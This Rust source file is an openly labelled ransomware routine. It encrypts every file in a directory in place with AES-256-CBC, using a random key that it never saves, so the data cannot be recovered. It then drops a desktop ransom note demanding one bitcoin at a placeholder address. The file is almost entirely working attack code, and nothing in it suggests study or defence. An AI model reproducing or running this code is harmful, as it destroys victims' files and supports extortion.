use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;
use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use rand::Rng;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

/// Encrypts files in the specified directory.
pub fn encrypt_directory(path: &str) {
    let key = rand::thread_rng().gen::<[u8; 32]>();
    let iv = rand::thread_rng().gen::<[u8; 16]>();
    let cipher = Aes256Cbc::new_from_slices(&key, &iv).unwrap();

    for entry in fs::read_dir(path).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        if path.is_file() {
            let mut data = Vec::new();
            let mut file = File::open(&path).unwrap();
            file.read_to_end(&mut data).unwrap();

            let ciphertext = cipher.encrypt_vec(&data);
            let mut file = File::create(&path).unwrap();
            file.write_all(&ciphertext).unwrap();
        }
    }

    drop_ransom_note();
}

/// Drops a ransom note on the desktop.
fn drop_ransom_note() {
    let desktop = dirs::desktop_dir().unwrap_or_else(|| Path::new("C:\\Users\\Public\\Desktop").to_path_buf());
    let note_path = desktop.join("README_RESTORE_FILES.txt");
    let mut file = File::create(note_path).unwrap();
    writeln!(file, "Your files have been encrypted.").unwrap();
    writeln!(file, "To recover them, send 1 BTC to the following address:").unwrap();
    writeln!(file, "1A2b3C4d5E6f7G8h9I0j").unwrap();
    writeln!(file, "Contact us at decrypt@example.com after payment.").unwrap();
}
